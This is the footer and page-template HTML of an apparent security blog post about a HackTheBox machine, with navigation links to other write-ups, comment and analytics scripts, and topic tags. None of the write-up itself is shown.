mt-1 mb-3" data-toc-skip>Hackthebox obscurity writeup</h3><div class="text-muted small"><p> information@obscurity:~$ Column Details Name obscurity IP 10.10.10.168 Points 30 Os ...</p></div></div></a></div></div></div><div class="post-navigation d-flex justify-content-between"> <a href="/posts/htb-obsecurity/" class="btn btn-outline-primary"><p>Hackthebox obscurity writeup</p></a> <a href="/posts/htb-travel/" class="btn btn-outline-primary"><p>Hackthebox Travel writeup</p></a></div><div id="disqus" class="pt-2 pb-2"><p class="font-italic text-center text-muted small"> Comments powered by <a href="https://disqus.com/">Disqus</a>.</p></div><script src="/assets/js/lib/jquery.disqusloader.min.js"></script> <script> var options = { scriptUrl: '//0xprashant.disqus.com/embed.js', disqusConfig: function() { this.page.url = 'http://localhost:4000/posts/htb-cache/'; this.page.identifier = '/posts/htb-cache/'; } }; $.disqusLoader('#disqus', options); </script></div></div></div><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/lozad/dist/lozad.min.js"></script> <script type="text/javascript"> const imgs = document.querySelectorAll('#post-wrapper img'); const observer = lozad(imgs); observer.observe(); </script><footer class="d-flex w-100 justify-content-center"><div class="d-flex justify-content-between align-items-center"><div class="footer-left"> <br></br> <script src="https://www.hackthebox.eu/badge/84820"></script></p></div><p class="mb-0"> © 2020 <a href="https://www.facebook.com/prashant.saini.37201">Prashant Saini</a>. <script> (function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){ (i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o), m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m) })(window,document,'script','https://www.google-analytics.com/analytics.js','ga'); ga('create', 'UA-157514490-1', 'auto'); ga('send', 'pageview'); </script> <script data-name="BMC-Widget" src="https://cdnjs.buymeacoffee.com/1.0.0/widget.prod.min.js" data-id="0xprashant" data-description="Support me on Buy me a coffee!" data-message="Like The Blog? Support Me!" data-color="#5F7FFF" data-position="right" data-x_margin="18" data-y_margin="18"></script></footer></div><div id="search-result-wrapper" class="d-flex justify-content-center unloaded"><div class="col-12 col-xl-11 post-content"><div id="search-hints"><h4 class="text-muted mb-4">Trending Tags</h4><a class="post-tag" href="/tags/hackthebox/">hackthebox</a> <a class="post-tag" href="/tags/john/">john</a> <a class="post-tag" href="/tags/wfuzz/">wfuzz</a> <a class="post-tag" href="/tags/cracking-id_rsa/">cracking id_rsa</a> <a class="post-tag" href="/tags/docker/">docker</a> <a class="post-tag" href="/tags/ftp/">ftp</a> <a class="post-tag" href="/tags/ldap/">ldap</a> <a class="post-tag" href="/tags/ldapsearch/">ldapsearch</a> <a class="post-tag" href="/tags/lfi/">lfi</a> <a class="post-tag" href="/tags/metasploit/">metasploit</a></div><div id="search-results" class="d-flex flex-wrap justify-content-center text-muted mt-3"></div></div></div></div><div id="mask"></div><a id="back-to-top" href="#" aria-label="back-to-top" class="btn btn-lg btn-box-shadow" role="button"> <i class="fas fa-angle-up"></i> </a> <script src="https://cdn.jsdelivr.net/npm/simple-jekyll-search@1.7.3/dest/simple-jekyll-search.min.js"></script> <script> SimpleJekyllSearch({ searchInput: document.getElementById('search-input'), resultsContainer: document.getElementById('search-results'), json: '/assets/js/data/search.json', searchResultTemplate: '<div class="pl-1 pr-1 pl-sm-2 pr-sm-2 pl-lg-4 pr-lg-4 pl-xl-0 pr-xl-0"> <a href="http://localhost:4000{url}">{title}</a><div class="post-meta d-flex flex-column flex-sm-row text-muted mt-1 mb-1"><div class="mr-sm-4"><i class="far fa-folder fa-fw"></i>{categories}</div><div><i class="fa fa-tag fa-fw"></i>{tags}</div></div><p>{snippet}</p></div>', noResultsText: '<p class="mt-5">Oops! No result founds.</p>' }); </script>
